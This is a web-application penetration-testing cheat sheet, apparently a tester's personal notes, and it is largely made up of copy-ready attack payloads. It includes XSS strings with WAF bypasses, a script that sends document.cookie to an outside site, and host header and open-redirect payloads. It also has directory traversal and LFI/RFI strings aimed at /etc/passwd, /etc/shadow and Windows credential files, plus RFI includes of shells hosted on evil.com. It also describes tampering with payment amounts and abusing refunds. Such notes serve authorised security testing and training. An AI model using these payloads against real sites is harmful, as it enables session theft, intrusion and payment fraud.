<img src="https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true" width="600">

Make life easier, not harder.
[PayloadsAllTheThings - GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Application version-related exploits
Search in [exploit-db](https://www.exploit-db.com/)

## Addons 

- Hackbar
- FoxyProxy Standard
- Wappalyzer
- Cookies Manager+
- SQL Inject Me
- XSS Me
- Tamper Data
- SecurityFocus Vulnerabilities search plugin
- Packet Storm search plugin
- Offsec Exploit-db Search

## Vulnerability Categories

- XSS
- Host Header Injection
- URL Redirection
- Parameter Tampering
- HTML Injection
- File Inclusion
- SPF Record Misconfiguration
- Insecure CORs Configuration
- SSRF
- Critical File Disclosure
- Source Code Disclosure
- CSRF
- Subdomain Takeover
- SQL Injection
- Command Injection
- File Upload Vulnerabilities
- XML Injection

## cURL to Burp Request Command
curl -x 127.0.0.1:8080

## XSS Payload Example
```html
%3cscript%3ealert%281%29%3c%2fscript%3e
```
# Enumeration

## 1. Information Gathering

- has to know the terminology and gather information about the version, Server, Frameworks, and Default credentials.
- Identify previous vulnerabilities related to the application.

### Injection Points

- Where vulnerabilities can exist.
- Injection paint is vulnerability location.(parameters)

### Information Flow

1. Site
2. Subdomains
3. Select unpopular websites
4. Find IP Address
5. Which programming language they are using
6. Open ports and services
7. Site:eur.nl responsible disclosure

### Tools for Finding Subdomains

- [VirusTotal](https://www.virustotal.com/gui/home/search)
- [Subbrute](https://github.com/TheRook/subbrute)
  ```bash
  ./subbrute.py -c 50 example.com > example.com
  ```
- [Altdns](https://github.com/infosec-au/altdns)
- [Netcraft](https://searchdns.netcraft.com/)
- [HTTP Status Checker](https://httpstatus.io/)
- [SubFinder](https://github.com/projectdiscovery/subfinder)

sort out subdomain unpapularity (Less travel route)

### Finding IP Address & Open Ports

- Ping to find tha ip address or use the namp to know the open ports aggresive scanning os and version information & vuln scanning.
- If it is not in scope do the poty numnber 80 and 443 for vulnerability scanning.

### Server Information & Banner Grabbing

```bash
whatweb domain.name
nikto -h domain.name
nc domain.name 80
nc head / http/1.0
telnet
waplayzer
```
---
## API Key and Token Leaks

```markdown
# API Key and Token Leaks

## Common Causes of Leaks

- **Hardcoding in Source Code**: Developers may unintentionally leave API keys or tokens directly in the source code.
- **Public Repositories**: Accidentally committing sensitive keys and tokens to publicly accessible version control systems like GitHub.
- **Hardcoding in Docker Images**: API keys and credentials might be hardcoded in Docker images hosted on DockerHub or private registries.
- **Logs and Debug Information**: Keys and tokens might be inadvertently logged or printed during debugging processes.
- **Configuration Files**: Including keys and tokens in publicly accessible configuration files (e.g., `.env` files, `config.json`, `settings.py`, or `.aws/credentials`).

## Scan a GitHub Organization

To scan an entire GitHub organization for leaks, run the following command:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
```

## Scan a GitHub Repository, its Issues, and Pull Requests

To scan a GitHub repository including its issues and pull requests, run:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
```

## Scan a Docker Image for Verified Secrets

To scan a Docker image for secrets, use the following command:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets
```
## Account Takeover

* [Password Reset Feature](#password-reset-feature)
    * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)
    * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
    * [Password Reset via Email Parameter](#password-reset-via-email-parameter)
    * [IDOR on API Parameters](#idor-on-api-parameters)
    * [Weak Password Reset Token](#weak-password-reset-token)
    * [Leaking Password Reset Token](#leaking-password-reset-token)
    * [Password Reset via Username Collision](#password-reset-via-username-collision)
    * [Account Takeover Due To Unicode Normalization Issue](#account-takeover-due-to-unicode-normalization-issue)
* [Account Takeover via Web Vulneralities](#account-takeover-via-web-vulneralities)
    * [Account Takeover via Cross Site Scripting](#account-takeover-via-cross-site-scripting)
    * [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
    * [Account Takeover via CSRF](#account-takeover-via-csrf)
    * Account Takeover via JWT - * JSON Web Token might be used to authenticate an user. Edit the JWT with another User ID / Email - Check for weak JWT signature

## Business Logic Errors

* [Methodology](#methodology)
    * [Review Feature Testing](#review-feature-testing)
    * [Discount Code Feature Testing](#discount-code-feature-testing)
    * [Delivery Fee Manipulation](#delivery-fee-manipulation)
    * [Currency Arbitrage](#currency-arbitrage)
    * [Premium Feature Exploitation](#premium-feature-exploitation)
    * [Refund Feature Exploitation](#refund-feature-exploitation)
    * [Cart/Wishlist Exploitation](#cartwishlist-exploitation)
    * [Thread Comment Testing](#thread-comment-testing)
* [References](#references)

## Methodology

Unlike other types of security vulnerabilities like SQL injection or cross-site scripting (XSS), business logic errors do not rely on problems in the code itself (like unfiltered user input). Instead, they take advantage of the normal, intended functionality of the application, but use it in ways that the developer did not anticipate and that have undesired consequences.

Common examples of Business Logic Errors.

### Review Feature Testing

* Assess if you can post a product review as a verified reviewer without having purchased the item.
* Attempt to provide a rating outside of the standard scale, for instance, a 0, 6 or negative number in a 1 to 5 scale system.
* Test if the same user can post multiple ratings for a single product. This is useful in detecting potential race conditions.
* Determine if the file upload field permits all extensions; developers often overlook protections on these endpoints.
* Investigate the possibility of posting reviews impersonating other users.
* Attempt Cross-Site Request Forgery (CSRF) on this feature, as it's frequently unprotected by tokens.

### Discount Code Feature Testing

* Try to apply the same discount code multiple times to assess if it's reusable.
* If the discount code is unique, evaluate for race conditions by applying the same code for two accounts simultaneously.
* Test for Mass Assignment or HTTP Parameter Pollution to see if you can apply multiple discount codes when the application is designed to accept only one.
* Test for vulnerabilities from missing input sanitization such as XSS, SQL Injection on this feature.
* Attempt to apply discount codes to non-discounted items by manipulating the server-side request.

### Delivery Fee Manipulation

* Experiment with negative values for delivery charges to see if it reduces the final amount.
* Evaluate if free delivery can be activated by modifying parameters.

### Currency Arbitrage

* Attempt to pay in one currency, for example, USD, and request a refund in another, like EUR. The difference in conversion rates could result in a profit.

### Premium Feature Exploitation

* Explore the possibility of accessing premium account-only sections or endpoints without a valid subscription.
* Purchase a premium feature, cancel it, and see if you can still use it after a refund.
* Look for true/false values in requests/responses that validate premium access. Use tools like Burp's Match & Replace to alter these values for unauthorized premium access.
* Review cookies or local storage for variables validating premium access.

### Refund Feature Exploitation

* Purchase a product, ask for a refund, and see if the product remains accessible.
* Look for opportunities for currency arbitrage.
* Submit multiple cancellation requests for a subscription to check the possibility of multiple refunds.

### Cart/Wishlist Exploitation

* Test the system by adding products in negative quantities, along with other products, to balance the total.
* Try to add more of a product than is available.
* Check if a product in your wishlist or cart can be moved to another user's cart or removed from it.

### Thread Comment Testing

* Check if there's a limit to the number of comments on a thread.
* If a user can only comment once, use race conditions to see if multiple comments can be posted.
* If the system allows comments by verified or privileged users, try to mimic these parameters and see if you can comment as well.
* Attempt to post comments impersonating other users.

## References

* [Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws)
* [Business Logic Vulnerability - OWASP - 2024](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
* [CWE-840: Business Logic Errors - CWE - March 24, 2011](https://cwe.mitre.org/data/definitions/840.html)
* [Examples of Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws/examples)
# 3. Cross-Site Scripting (XSS)

## XSS Background

**Impact of XSS:**
- Cookie theft
- Keylogging
- Phishing
- URL Redirection
- Site defacement

### Common XSS Injection Points

- Comment boxes
- Forums
- Signup/Login pages
- Search bars
- Registration forms
- Feedback forms
- Contact us forms etc....

### How to Hunt for XSS

1. Find an input parameter and provide input If input reflects or is stored, there may be XSS.
2. Try executing JavaScript if you succeed to execute any javascript there then there is a XSS vulnerability.
3. sort out all the parameters in burp-suite and check one by one or browse it through the webserver and check it here reflecting or not.

## XSS Payloads

```html
"><script>alert(1)</script>
"><svg/onload=alert(1)>
```
### Cloudflare XSS Bypasses
```html
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`bohdan`+
1'"><img/src/onerror=.1|alert``>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
</script><svg><script>alert(1)-%26apos%3B
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<svg onload\r\n=$.globalEval("al"+"ert()");>
?"></script><base%20c%3D=href%3Dhttps:\mysite>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<a href=javas&#99;ript:alert(1)>
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
"><img src=x onerror=alert(document.cookie);.jpg
```

1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
2. Event Handlers

### White Characters Identifying XSS

- Special characters: `' " < > / // ( ) ^ script img svg div alert prompt`
- Event Handlers:
  ```html
  Hello" onkeypress="prompt(1)
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
  ```
practise excercise: websites:

https://prompt.ml/0
http://leettime.net/xsslab1/

### Bypassing XSS Filters

- Bypass using UTF-8 Encoding
- Bypass using Unicode Encoding
- Bypass using HTML Encoding
- Bypass using Octal Encoding
- Bypass using Common WAF Bypass

### Cloudflare XSS Bypass

```html
<svg/OnLoad="`${prompt``}`">
<svg/onload=alert`bohdan`>
```

### Practical XSS Exercises

- [Prompt.ml](https://prompt.ml/0)
- [XSS Lab](http://leettime.net/xsslab1/)

---
# 4. Manual XSS Vector Building

## Steps to Find & Exploit XSS

1. Find an input field that reflects input.
2. Check response in **view-source**.
3. Close any open tags.
4. Use event handlers like `onmouseover` for bypassing sanitization.

Example:
```html
<input type="text" name="name" value='hello'>
<input type="submit" name="submit" value="search">
```
Payload:
```html
'onmouseover='alert(1);
```

---

# References

- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [LeetTime XSS Labs](http://leettime.net/xsslab1/)
- [Prompt.ml](https://prompt.ml/)

---
# XSS & Host Header Injection Testing Guide

## 1. First SDIPER Application
- Sort out the parameters.
- Check one by one → Send to repeater → Use payloads (`hello1`, `hello2`).
- If `hello2` is reflecting, try scripts or brute-force attacks.
- Sort the maximum length of the first 10 results, then show the response in the browser.

### Payload Naming:
- Use `xss.txt` for payloads or manually set a payload.
- Manual testing is better for stored XSS vulnerabilities.

## 2. Brute-Force Attack Considerations
- If you want to stop URL encoding, go for payload encoding.
- Uncheck URL encoding for better results.

## 3. XSS Through Header Injection
- Capture the request using **Burp Suite**.
- Add a `Referer` field below the `Host` in the header.
- Send it to the repeater:
  ```
  Host: abc.com
  Referer: hello
  ```
- If `hello` is reflecting, use the following payload:
  ```html
  <script>alert(1)</script>
  ```

## 4. URL Redirection
- Instead of `alert(1)`, use URL redirection.
- If it redirects to `bing.com`, it is vulnerable.
  ```html
  <script>document.location.href="http://bing.com"</script>
  ```
  Example vulnerable URL:
  ```
  http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=<script>document.location.href="http://bing.com"</script>
  ```

## 5. Phishing via XSS
- Instead of `alert(1)`, use an iframe:
  ```html
  <iframe src="http://bing.com" height="100%" width="100%"></iframe>
  ```

## 6. Cookie Stealing via XSS
- Victim's website transfers cookies to the attacker's site:
  ```html
  <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>
  ```

## 7. XSS Through File Uploading
### Method 1:
- The `file_name` parameter is reflecting in the **view-source** (e.g., `abc.jpeg`).
- Attack by injecting scripts into the filename.
- Use **Intruder** with common payloads.

### Method 2:
- Upload a file containing an XSS script.
- Access the file to trigger the payload.

## 8. XSS Through RFI Vulnerability
- If an application has RFI vulnerability, host an XSS script on the attacker's server:
  ```
  http://10.10.11.24/xss.html  # Contains XSS payload
  ```
- Execute via a vulnerable endpoint:
  ```
  http://abc.com/cmn/js/ajax.php?url=http://10.10.11.24/xss.html
  ```

## 9. Self-XSS to Reflected XSS
- Copy the vulnerable **HTML response** from Burp Suite.
- Save it as an HTML file and open it in Firefox.
- Instead of `alert(1)`, use:
  ```html
  document.location.href="http://bing.com"
  ```
- Example:
  ```
  /@213dewf it is reflecting in browser → add XSS script:
  /@213dewf"><script>alert(1)</script>
  ```

## 10. Blind XSS Vulnerability
- Use **Hunter** for detection.

---

# Host Header Injection
## 1. Overview
- Exploiting host header injection in **virtual hosting environments**.
- Can lead to **web cache poisoning, XSS, password reset poisoning, and internal host access**.
- i.e 3xx and 200 status code of 300 | 301 | 302 | 303 | 304 -- 3xx is the best one for this attack for an example login page has multiple redirection request, modify any one of them

## 2. Attack Methods
### Method 1:
```http
Host: bing.com
```
### Method 2:
```http
Host: bing.com
X-Forwarded-Host: realweb.com
```
### Method 3:
```http
Host: realweb.com
X-Forwarded-Host: bing.com
```
### Method 4:
```http
Referer: https://www.bing.com/
Try to change host and referer header because few host is verify for referer header information. 
also do the same first three attack to insert the referer header (Change referer header)
```

## 3. Host Header Injection with Web Cache Poisoning
- Follow the above methods.
- Click anywhere on the web application.
- If redirected to `bing.com`, the site is vulnerable.

## 4. Password Reset Poisoning
- Obtain a **password reset link**.
- Modify the `Host` header.

## 5. Host Header Attack for XSS
- Check if the response contains:
  ```html
  https://bing.com/?locald">
  ```
- Use the payload:
  ```html
  Host: bing.com"><script>alert(1)</script>
  ```

## 6. Host Header Injection on Referer Header
- Modify headers:
  ```http
  Connection: close
  Referer: https://www.bing.com/
  ```

## 7. Subdomain-Based Host Header Injection
- Use existing and non-existing subdomains to inject headers.

## 8. Advanced Host Header Attacks
### Internal Host Access:
```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
---
# 4. URL Redirection (Used as a Phishing Attack) or Open Redirection

## HTTP Status Code: 3xx, 200

### Common Parameters List:
```
dest,redirect,?,something is redirect to page
uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,validate,domain,callback,return,page,feed,host,port,next,data,reference,site,html,u=
```

### Payload Examples:
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

### Approach:
1. **URL Redirection on Path Fragments:**
   ```
   example: any.com/payloads
   any.com/bing.com
   any.com//bing.com
   any.com//bing.com/%2e%2e
   ```
   Use the payload to attempt a brute-force attack.

2. **Sort the Parameters Returning a 200 Response:**
   ```
   GET /url=https://bing.com/
   ```

### Bypassing Techniques:
- Using a whitelisted domain or keyword: `https://www.whitelisted.com/evil.com` redirects to `evil.com`
- Using `//` to bypass `http` blacklisted keyword: `//google.com`
- Using `https:` to bypass `//` blacklisted keyword: `https:google.com`
- Using `%E3%80%82` to bypass `.` blacklisted character: `//google%E3%80%82com`
- Using parameter pollution: `?next=whitelisted.com&next=google.com`
- Using `@` character: `http://www.theirsite.com@yoursite.com/`

**More payloads and techniques:** [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md 
---
# Directory Traversal

* [Methodology](#methodology)
    * [URL Encoding](#url-encoding)
    * [Double URL Encoding](#double-url-encoding)
    * [Unicode Encoding](#unicode-encoding)
    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
    * [Mangled Path](#mangled-path)
    * [NULL Bytes](#null-bytes)
    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
* [Exploit](#exploit)
    * [UNC Share](#unc-share)
    * [ASPNET Cookieless](#asp-net-cookieless)
    * [IIS Short Name](#iis-short-name)
    * [Java URL Protocol](#java-url-protocol)
* [Path Traversal](#path-traversal)
    * [Linux Files](#linux-files)
    * [Windows Files](#windows-files)

## Tools

* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer

    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```
## Methodology

We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### URL Encoding

| Character | Encoded |
| --- | -------- |
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |

**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### Double URL Encoding

Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.

| Character | Encoded |
| --- | -------- |
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |

**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### Unicode Encoding

| Character | Encoded |
| --- | -------- |
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |

**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### Overlong UTF-8 Unicode Encoding

The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.

| Character | Encoded |
| --- | -------- |
| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` | `%c0%5c`, `%c0%80%5c` |

### Mangled Path

Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.

```powershell
..././
...\.\
```

**Example:**: Mirasys DVMS Workstation <=5.12.6

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

### NULL Bytes

A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.

**Example:** Homematic CCU3 CVE-2019-9726

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### Reverse Proxy URL Implementation

Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.

```powershell
..;/
```

**Example**: Pascom Cloud Phone System CVE-2021-45967

A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```
### UNC Share

A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.

An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.

```powershell
\\localhost\c$\windows\win.ini
```

Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.

### IIS Short Name

The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.

* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

    ```ps1
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
    ```

* [bitquark/shortscan](https://github.com/bitquark/shortscan)

    ```ps1
    shortscan http://example.org/
    ```
### Windows Files

The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.

```powershell
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)

```powershell
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```
# 5. Parameter Tampering (All Parameters Change)

**Description:** The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control. 

The parameter modification of form fields can be considered a typical example of Web Parameter Tampering attack. 
For example, consider a user who can select 
Form field values (combo box, check box, etc.) on an application page. When these values are submitted by the user, they could be acquired and arbitrarily manipulated by an attacker. 

**Targeted Parameters:**
```
mainly : price,amount,cost,discount,quantity, transaction  any user id's(priviledge escalation),number,strings,quality,delivery charges discounts etc... to change the parameters and forwards request to payment gateway.
using money we can search in burp if it is matches change the amount or above parameters then and intercept off.

Priviledge escalation attack senario login into account one for admin and another normal user in different browsers. access few admin resource similar to normal user function and paste that url in normal user browser if the normal user able to access admin functionalities there is a vulnerability.
```

### Attack Scenarios:
#### Example 1:
```
Qty=500&price=100  →  Qty=5&price=100
```
#### Example 2:
```
Cashback=0&amt=100 & qty=1
Cashback=100000&amt=100 & qty=1 there is parameter tempering on cashback
```
#### Example 3:
Modify the request in Burp Suite before the payment gateway.
do the nessasary steps and before an application is going to payment gateway do it there like send the request to repeater then change the amount. have to drop a  packet.
we can use the -amount also  such as 100  --99

### Bypass Methods:
1. sometimes amount should be encoding so copy the url and decode to change amount after that encode the payload
2. while leads to priviledge escalation for example normal user login into an application goto values like amount or profile information update if the cookie is weak configured goto inspect element-->storage-->change values like false-->true or change amount....
3. porfile pic upload with malicious link and geo-location
---
# 6. HTML Injection

**Description:** HTML injection occurs when an attacker can inject arbitrary HTML code into a vulnerable web page.

### Payloads: 1. Hyderlink click 2. html payload
```html
<h1>Vulnerable for HTML Injection</h1>
<A HREF="http://bing.com/">OffensiveHunter</A>
```

**DOM HTML Injection Example:**
```html
<script>
function setMessage(){
 var t=location.hash.slice(1);
 document.getElementById(t).innerText = "The DOM is now loaded and can be manipulated.";
}
window.onload = setMessage;
</script>
<a href="#message"> Show Here</a>
<div id="message">Showing Message</div>
```

---

# 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)

### **Impact of File Inclusion:**
1. Code execution on the server
2. Code execution on the client side
3. Denial of Service (DoS) attacks
4. Information disclosure (passwords, usernames, system files)

### **Common LFI Parameters:**
```
file, document, folder, root, path, pg, style, pdf, template, php_path, doc, content, static
```

### **Basic LFI Exploitation:**

## Summary

- [Tools](#tools)
- [Local File Inclusion](#local-file-inclusion)
    - [Null Byte](#null-byte)
    - [Double Encoding](#double-encoding)
    - [UTF-8 Encoding](#utf-8-encoding)
    - [Path Truncation](#path-truncation)
    - [Filter Bypass](#filter-bypass)
- [Remote File Inclusion](#remote-file-inclusion)
    - [Null Byte](#null-byte-1)
    - [Double Encoding](#double-encoding-1)
    - [Bypass allow_url_include](#bypass-allow_url_include)
- [Labs](#labs)
- [References](#references)

## Tools

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool

## Local File Inclusion

**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.

Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### Null Byte

:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 Encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### Path Truncation

On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.

```powershell
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Filter Bypass

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## Remote File Inclusion

> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.

Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.

```ini
allow_url_include = On
```

Most of the filter bypasses from LFI section can be reused for RFI.

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null Byte

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Bypass allow_url_include

When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.

1. Create a share open to everyone
2. Write a PHP code inside a file : `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
### **Basic RFI Exploitation:**
```bash
http://example.com/index.php?page=http://evil.com/shell.txt
```

### **LFI/RFI Bypass Techniques:**
- **Null byte injection:** `page=../../../etc/passwd%00`
- **Double encoding:** `page=%252e%252e%252fetc%252fpasswd`
- **PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php`

**Tools:**
- [Kadimus](https://github.com/P0cL4bs/Kadimus)
- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [fimap](https://github.com/kurobeats/fimap)

etc/passwd
etc/passwd%00
etc%2fpasswd
etc%2fpasswd%00
etc%5cpasswd
etc%5cpasswd%00
etc%c0%afpasswd
etc%c0%afpasswd%00
C:\boot.ini
C:\WINDOWS\win.ini
C:/apache2/log/access_log
C:/apache2/log/error.log
C:/apache2/log/error_log
C:/documents and settings/administrator/desktop/desktop.ini

